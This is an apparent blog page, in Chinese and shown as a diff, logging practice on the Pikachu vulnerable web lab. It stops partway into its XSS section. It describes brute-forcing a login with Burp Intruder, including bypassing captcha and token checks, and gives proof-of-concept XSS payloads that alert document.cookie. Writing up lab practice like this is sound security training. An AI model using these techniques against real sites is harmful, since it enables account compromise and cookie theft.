@@ -1,0 +1,1619 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="atdunbg">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://atdunbg.xyz/2023/08/10/pikachu_practice/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pikachu练习记录">
+<meta property="og:url" content="http://atdunbg.xyz/2023/08/10/pikachu_practice/index.html">
+<meta property="og:site_name" content="Atdunbg&#39;s Blog">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://atdunbg.xyz/images/redefine-og.webp">
+<meta property="article:published_time" content="2023-08-10T15:06:00.000Z">
+<meta property="article:modified_time" content="2025-12-26T03:22:59.067Z">
+<meta property="article:author" content="atdunbg">
+<meta property="article:tag" content="Pikachu">
+<meta property="article:tag" content="网络安全">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://atdunbg.xyz/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Pikachu练习记录 | Atdunbg&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+        
+            
+    
+            
+    
+            
+                
+                    <meta name="referrer" content="no-referrer" />
+                
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+        
+<script src="/js/build/libs/anime.min.js"></script>
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"atdunbg.xyz","root":"/","language":"zh-CN","path":"search.json"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":true,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":true,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"https://hexoimage.pages.dev/file/089291f3f0192bb92a1ce.jpg","dark":"https://hexoimage.pages.dev/file/089291f3f0192bb92a1ce.jpg"},"title":"Atdunbg's Blog","subtitle":{"text":["..."],"hitokoto":{"enable":true,"show_author":true,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/atdunbg","instagram":null,"zhihu":null,"twitter":null,"email":"atdunbg@qq.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"Daisy Crown","artist":"Empty old City/Wuthering Waves","url":"https://music.163.com/song/media/outer/url?id=2676687608.mp3","cover":"https://p2.music.126.net/J0ZfqWmqX3zGJLzTubJ7vg==/109951170498554226.jpg","lrc":null},{"name":"Destiny【BlackYearning】[RWBY Doujin remix]","artist":"Cre-sc3NT","url":"https://music.163.com/song/media/outer/url?id=463311509.mp3","cover":"https://p1.music.126.net/_M3lkuYe93Fdo8kBLDBQlA==/109951162870251332.jpg"}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"书签":{"path":"/bookmarks","icon":"fa-solid fa-bookmark"},"Google":{"path":"https://www.google.com/","icon":"fa-brands fa-google"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"right","first_item":"info","announcement":null,"show_on_mobile":true,"links":{"BookMarks":{"path":"/bookmarks","icon":"fa-solid fa-bookmark"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/1/1 12:00:00"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+	<span class="scroll-progress-bar"></span>
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        Atdunbg&#39;s Blog
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({ loop: true })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [20, 0],
+                translateZ: 0,
+                opacity: [0, 1],
+                filter: ['blur(5px)', 'blur(0px)'],
+                easing: "easeOutExpo",
+                duration: 1200,
+                delay: (el, i) => 300 + 20 * i,
+            })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [0, -20],
+                opacity: [1, 0],
+                filter: ['blur(0px)', 'blur(5px)'],
+                easing: "easeInExpo",
+                duration: 1000,
+                delay: (el, i) => 15 * i,
+                complete: function() {
+                    hidePreloader();
+                }
+            }, '-=700');
+
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Atdunbg&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/bookmarks"
+                                        >
+                                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                                    书签
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   target="_blank" rel="noopener" href="https://www.google.com/"
+                                        >
+                                    <i class="fa-brands fa-google fa-fw"></i>
+                                    GOOGLE
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    归档
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/bookmarks"
+                        >
+                            <span>
+                                书签
+                            </span>
+                            
+                                <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           target="_blank" rel="noopener" href="https://www.google.com/"
+                        >
+                            <span>
+                                GOOGLE
+                            </span>
+                            
+                                <i class="fa-brands fa-google fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                归档
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/bookmarks"
+                        >
+                            <span>BookMarks</span>
+                            <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/tags"
+                        >
+                            <span>Tags</span>
+                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/categories"
+                        >
+                            <span>Categories</span>
+                            <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">13</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">7</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">17</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			
+			
+			<img src="https://hexoimage.pages.dev/file/43665ba95443e49885078.jpg" alt="Pikachu练习记录" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75" />
+			
+			<div class="w-full flex items-center absolute bottom-0 justify-start">
+				<h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-semibold backdrop-blur-lg rounded-xl border border-border-color ">Pikachu练习记录</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/redefine-avatar.png">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">atdunbg</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-08-10 15:06</span>
+        <span class="mobile">2023-08-10 15:06</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-12-26 03:22:59</span>
+            <span class="mobile">2025-12-26 03:22:59</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Pikachu/">Pikachu</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Pikachu/">Pikachu</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E9%9D%B6%E5%9C%BA/">靶场</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>3.4k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>14 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h2 id="Pikachu练习记录"><a href="#Pikachu练习记录" class="headerlink" title="Pikachu练习记录"></a>Pikachu练习记录</h2><h2 id="0x01-Pikachu靶场"><a href="#0x01-Pikachu靶场" class="headerlink" title="0x01 Pikachu靶场"></a>0x01 Pikachu靶场</h2><p>Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。 如果你是一个Web渗透测试学习人员且正发愁没有合适的靶场进行练习，那么Pikachu可能正合你意。</p>
+<p>靶场链接：<a class="link"   target="_blank" rel="noopener" href="https://github.com/zhuifengshaonianhanlu/pikachu" >Pikachu<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h2 id="0x02-暴力破解"><a href="#0x02-暴力破解" class="headerlink" title="0x02 暴力破解"></a>0x02 暴力破解</h2><h3 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h3><p>如题，直接放burp里暴力破解即可</p>
+<h3 id="验证码绕过（on-server）"><a href="#验证码绕过（on-server）" class="headerlink" title="验证码绕过（on server）"></a>验证码绕过（on server）</h3><p>在intruder里同一个验证码可重复使用</p>
+<h3 id="验证码绕过（on-client）"><a href="#验证码绕过（on-client）" class="headerlink" title="验证码绕过（on client）"></a>验证码绕过（on client）</h3><p>在intruder里同一个验证码可重复使用，也可以审查元素把相关的验证码代码删掉，不影响</p>
+<h3 id="Token防爆破？"><a href="#Token防爆破？" class="headerlink" title="Token防爆破？"></a>Token防爆破？</h3><p>多次抓包后发现，每次抓取的数据包中都含有下次请求所需要的token</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/93c1e629ff51411a8dd4ea533d963e9c"
+                      alt="token防爆破"
+                ></p>
+<p>可以用burp里Intruder进行爆破，爆破类型用Pitchfork，爆破变量为password和token</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/6b3b71caf0f2436ebbb3ea5e7a314dec"
+                      alt="token防爆破"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/200238fc90554a519f8351a42500e833"
+                      alt="token防爆破"
+                ></p>
+<p>对于token载荷相关设置，Payload type选择为 Recursive grep（递归搜索）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/9593577156c644adaebdb73e92b11b1c"
+                      alt="token防爆破"
+                ><br>然后在设置中的Grep - Extract中添加过滤项，找到token的位置，进行添加，同时把token值复制一下</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/685ec0ee19d54df6ac580fdfd7eb1906"
+                      alt="token防爆破"
+                ></p>
+<p>最后填写下一个token值开始爆破</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/0b079f2c0fe541438b071614d3b0aa04"
+                      alt="token防爆破"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/e1ca103f02c94e70b1ede69fca8a8193"
+                      alt="token防爆破"
+                ></p>
+<h2 id="0x03-Cross-Site-Scripting"><a href="#0x03-Cross-Site-Scripting" class="headerlink" title="0x03 Cross-Site Scripting"></a>0x03 Cross-Site Scripting</h2><h3 id="反射型xss（get）"><a href="#反射型xss（get）" class="headerlink" title="反射型xss（get）"></a>反射型xss（get）</h3><p>输入框被限制了最大输入长度，但是可以通过审查元素修改maxlength值来解除限制</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/10c035bdcf644ccb94a0a7a37753a2a2"
+                      alt="反弹型xss1"
+                ></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入框直接上脚本</span><br><span class="line">&lt;script&gt;alert(&#x27;hello&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="反射型xss（post）"><a href="#反射型xss（post）" class="headerlink" title="反射型xss（post）"></a>反射型xss（post）</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">登陆进去后输入框内输入以下内容</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h3><p>输入hello正常文本</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/9786a08c2f5c41ceacb971a40c3fe15c"
+                      alt="dom型xss1"
+                ></p>
+<p>输入下方文本</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#x27; onclick=alert(&#x27;hello&#x27;)&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/c833289eb960479085de9bcb64f30698"
+                      alt="dom型xss2"
+                ></p>
